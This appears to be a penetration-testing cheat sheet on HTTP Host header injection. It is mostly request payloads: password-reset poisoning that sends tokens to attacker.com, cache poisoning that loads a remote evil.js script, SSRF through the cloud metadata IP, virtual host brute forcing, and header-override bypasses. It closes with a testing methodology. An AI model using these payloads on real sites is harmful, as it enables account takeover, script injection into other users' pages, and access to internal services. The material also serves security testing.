# Host Header Injection

## Overview
Manipulation of the HTTP Host header to poison caches, redirect password reset links, and achieve SSRF.

## Attack Vectors

### Password Reset Poisoning
```
# Attacker sends request with malicious Host header
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Server generates: https://attacker.com/reset?token=REAL_TOKEN
# Victim clicks → token sent to attacker
```

### Cache Poisoning via Host
```
# Inject Host to poison cache with malicious content
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If response cached and served to others:
<script src="https://attacker.com/evil.js">
```

### SSRF via Host Header
```
# If internal routing based on Host
Host: internal-admin.local
Host: 169.254.169.254  # AWS metadata
Host: 192.168.1.1
```

### Virtual Host Brute Force
```
# Discover internal vhosts
Host: admin.target.com
Host: internal.target.com
Host: dev.target.com
Host: staging.target.com
Host: vpn.target.com

# If different response → vhost exists
```

## Host Header Override Headers
```
# Some apps trust these over the actual Host
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com

# Test all combinations:
Host: target.com
X-Forwarded-Host: attacker.com

Host: attacker.com
X-Forwarded-Host: target.com (for bypassing host validation)
```

## Port Manipulation
```
# Add unusual port
Host: target.com:443
Host: target.com:80
Host: target.com:8080
Host: target.com:22

# Some frameworks strip port before comparison
Host: target.com:25  # SMTP port — SSRF risk
```

## Absolute URL Bypass
```
# Use absolute URL in request line (HTTP/1.1 proxy behavior)
GET http://target.com/admin HTTP/1.1
Host: attacker.com
```

## Subdomain Attack
```
# Malformed Host with subdomain
Host: target.com.attacker.com
Host: attacker.com.target.com
Host: evil.target.com
```

## Testing Methodology
1. Identify password reset, email notification, redirect features
2. Test Host header with attacker.com — check if reflected in response/email
3. Test override headers (X-Forwarded-Host, etc.)
4. Test for cache poisoning: send malicious Host, check if cached
5. Test SSRF: Host: internal-service / metadata IP
6. Brute force virtual hosts for hidden applications
7. Check if Host is reflected in Location headers, cookies, HTML

## Impact
- Account takeover via password reset poisoning
- Cache poisoning → XSS at scale
- SSRF to internal services
- Access to hidden virtual hosts
